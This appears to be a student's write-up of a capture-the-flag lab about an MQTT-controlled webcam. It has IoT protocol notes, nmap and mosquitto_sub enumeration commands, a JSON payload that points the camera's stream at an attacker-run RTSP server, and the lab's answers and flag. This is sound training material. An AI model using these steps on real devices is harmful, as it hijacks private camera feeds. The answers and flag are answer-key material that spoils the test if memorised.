# Day_21 [MQTT] Have yourself a merry little webcam

+ Deployable Website: No
+ Deployable Container: Yes

Description: After investigating the web camera implant through hardware and firmware reverse engineering, you are tasked with identifying and exploiting any known vulnerabilities in the web camera. Elf Mcskidy is confident you won't be able to compromise the web camera as it seems to be up-to-date, but we will investigate if off-the-shelf exploits are even needed to take back control of the workshop.

> IP: 10.10.185.233

## LEARNING OBJECTIVES

+ Explain the Internet of Things, why it is important, and if we should be concerned about their danger.
+ Understand the difference between an IoT-specific protocol and other network service protocols.
+ Understand what a publish/subscribe model is and how it interacts with IoT devices.
+ Analyze and exploit the behavior of a vulnerable IoT device.

## NOTES

1. What is the Internet of Things?
   1. The Internet of Things (IoT) defines a categorization of just that, “things”. Devices are interconnected and rely heavily on communication to achieve a device’s objectives. Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.
   2. While the formal definition of IoT may change depending on who is setting it, the term can best be used as a broad categorization of “a device that sends and receives data to communicate with other devices and systems.”
   3. First, IoT categorizes unique devices, e.g., smart fridges, that don't match other categories, such as mobile devices. IoT devices tend to be lightweight, which means that the device's functionality and features are limited to only essentials. Because of their lightweight nature, modern features may be left out or overlooked, one of the most concerning being security. While we live in a modern era of security, it may still be considered secondary, which is why it is not included in core functionality.
   4. Second, devices are interconnected and often involve no human interaction. Think of authentication in which a human uses a password for security; these devices must not only be designed to communicate data effectively but also negotiate a secure means of communication such that human interaction is not required, e.g., using a password.
   5. Third, devices are designed to all be interconnected, so if device a is using x protocol and device b is using y protocol, it presents a significant problem in compatibility. The same concept can be applied to security where devices are incompatible but could fall back to insecure communication.

2. Introduction to IoT Protocols
   1. An "IoT protocol" categorizes any protocol used by an IoT device for machine-to-machine, machine-to-gateway, or machine-to-cloud communication. As previously defined, an IoT device sends and receives data to communicate with other devices and systems; with this in mind, an IoT protocol's objective should be efficient, reliable, and secure data communication.
   2. We can break up IoT protocols into one of two types, an **IoT data protocol** or an **IoT network protocol**. These types may be deceiving in their name as both are used to communicate data. How they differentiate is how and where the communication occurs. At a glance, an IoT data protocol commonly relies on the TCP/IP (Transmission Control Protocol/Internet Protocol) model, and an IoT network protocol relies on wireless technology for communication. We will continue expanding the purpose of these protocol types below.
   3. Let's break down an IoT data protocol into concepts that may be more familiar to us. An IoT data protocol is akin to common network services you may use or interact with daily, such as HTTP, SMB, FTP, and others. In fact, HTTP can be used as the backbone for other IoT protocols or as an IoT data protocol itself.
   4. An IoT network or wireless protocol still maintains the same goals as data protocols, that is, data communication, but it achieves it differently. Rather than relying on traditional TCP protocols, these protocols use wireless technology such as Wi-Fi, Bluetooth, ZigBee, and Z-Wave to transfer data and communicate between entities.

## STEPS

1. Start machine
2. Run Nmap scan
   1. > nmap -sC -sV $IP -oN initial
3. Check nmap of port 1883
   1. > nmap -p 1883 -sV -sC 10.10.108.88 -oN mosquitto_scan
      1. RESPONSE: $SYS/broker/version: mosquitto version 1.6.9
4. Use mosquitto to subscribe to the device/init to enumerate the device and get deviceID
   1. > mosquitto_sub -h 10.10.185.233 -t device/init
   2. Response: `ZQPVSRFABTEMEEG0YDLR`
5. Craft Payload
   1. {"CMD_NAMW":"CMD_VALUE", "URL_NAME":"URL_VALUE"}
   2. {"cmd":"10", "url":"rtsp://10.10.108.88:8554/hello"}
6. Start docker
   1. > sudo docker run --rm -it --network=host aler9/rtsp-simple-server

## QUESTIONS

1. What port is Mosquitto running on?
   1. `1883`
2. Is the device/init topic enumerated by Nmap during a script scan of all ports? (y/n)
   1. `Y`
3. What Mosquitto version is the device using?
   1. `1.6.9`
4. What flag is obtained from viewing the RTSP stream?
   1. `THM{UR_CAMERA_IS_MINE}`
